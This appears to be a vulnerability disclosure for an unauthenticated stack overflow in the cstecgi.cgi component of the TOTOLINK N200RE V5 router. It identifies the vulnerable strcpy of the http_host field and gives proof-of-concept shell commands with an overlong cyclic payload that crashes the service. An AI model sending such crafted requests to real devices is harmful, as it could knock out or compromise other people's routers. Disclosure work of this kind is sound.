## TOTOLINK N200RE V5 Router

Firmware Version: V5_V9.3.5u.5812_B20200414

Vulnerability Type: Stack Overflow

### Overview

A stack overflow vulnerability has been found in the `cstecgi.cgi` component of the TOTOLINK N200RE V5 Router. This vulnerability can also be exploited by remotely crafting requests without requiring a valid username and password.

### Vulnerability Details

The trigger point is located in the `sub_41F5B8` method of the `cstecgi.cgi` component. There is no length validation for the `http_host` field here, which causes `strcpy` to overflow.

![](../main/images/2026-02-08-21-26-58-6f959bd8-1428-4632-b09d-413d54e194ad.png)

`v25` only allocated 256 bytes of memory space.

![](../main/images/2026-02-08-21-28-08-303ec092-0874-4736-819a-3522d5fb31bb.png)

Then, the `http_host` parameter from the request parameters is retrieved and copied into `v25` using `strcpy`. If the `http_host` value is too long, it will cause an overflow.

### poc

Normal length

```shell
QUERY_STRING="" CONTENT_LENGTH=120 stationIp="192.168.0.1" REMOTE_ADDR="192.168.0.1" http_host="192.168.0.1" \
/www/cgi-bin/cstecgi.cgi << EOF
{"topicurl":"loginAuth","loginAuthUrl":"username=admin&password=admin&http_host=aaaabaaacaaadaaaeaaafa&flag=1"}
EOF
```

![](../main/images/2026-02-08-21-33-53-6280fa23-34f3-4227-936d-42ec0a7ec9bf.png)

Excessive length

```shell
QUERY_STRING="" CONTENT_LENGTH=598 stationIp="192.168.0.1" REMOTE_ADDR="192.168.0.1" http_host="192.168.0.1" \
/www/cgi-bin/cstecgi.cgi << EOF
{"topicurl":"loginAuth","loginAuthUrl":"username=admin&password=admin&http_host=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf&flag=1"}
EOF
```

![](../main/images/2026-02-08-21-34-24-image.png)

